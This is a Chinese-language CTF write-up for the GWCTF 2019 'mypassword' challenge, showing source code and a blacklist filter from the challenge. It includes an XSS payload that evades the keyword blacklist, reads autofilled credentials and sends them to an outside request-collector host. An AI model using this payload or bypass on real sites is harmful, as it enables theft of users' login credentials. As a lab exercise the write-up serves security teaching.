---
title: '[GWCTF 2019]mypassword'
date: 2024-09-06 20:22:45
tags: 
      - xss
categories: 刷题笔记
---

### [GWCTF 2019]mypassword(xss)

打开题目，后先查看源码有没有什么有用的东西，发现了`login.php、register.php`以及`login.js`

```
//login.js
if (document.cookie && document.cookie != '') {
	var cookies = document.cookie.split('; ');
	var cookie = {};
	for (var i = 0; i < cookies.length; i++) {
		var arr = cookies[i].split('=');
		var key = arr[0];
		cookie[key] = arr[1];
	}
	if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
		document.getElementsByName("username")[0].value = cookie['user'];
		document.getElementsByName("password")[0].value = cookie['psw'];
	}
}
```

代码会把cookie中的username和password填进当前表单

注册登录，根据题目提示这应该不是sql注入题目

<!--more-->

再看到feedback.php源码中的注释

```
if(is_array($feedback)){
				echo "<script>alert('反馈不合法');</script>";
				return false;
			}
			$blacklist = ['_','\'','&','\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
			foreach ($blacklist as $val) {
		        while(true){
		            if(stripos($feedback,$val) !== false){
		                $feedback = str_ireplace($val,"",$feedback);
		            }else{
		                break;
		            }
		        }
		    }
```

根据黑名单过滤的内容可以判断为XSS题目了

不过随便试试提交的内容发现，content.php响应头内有如下内容

```
Content-Security-Policy：default-src 'self';script-src 'unsafe-inline' 'self'
```

允许内联脚本执行, 但是不可以远程请求js脚本执行

构造payload把账号密码发到xss平台（http://requestbin.cn/）

```
<inpcookieut type="text" name="username"></inpcookieut>
<inpcookieut type="text" name="password"></inpcookieut>
<scricookiept scookierc="./js/login.js"></scricookiept>
<scricookiept>
	var uname = documcookieent.getElemcookieentsByName("username")[0].value;
	var passwd = documcookieent.getElemcookieentsByName("password")[0].value;
	var res = uname + " " + passwd;
	documcookieent.locacookietion="http://requestbin.cn/1c0ag8b?a="+res;
</scricookiept>
```

等待一会刷新requestbin 即可得到账号密码，flag为密码
![image-20240906204606733](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409062046793.png)
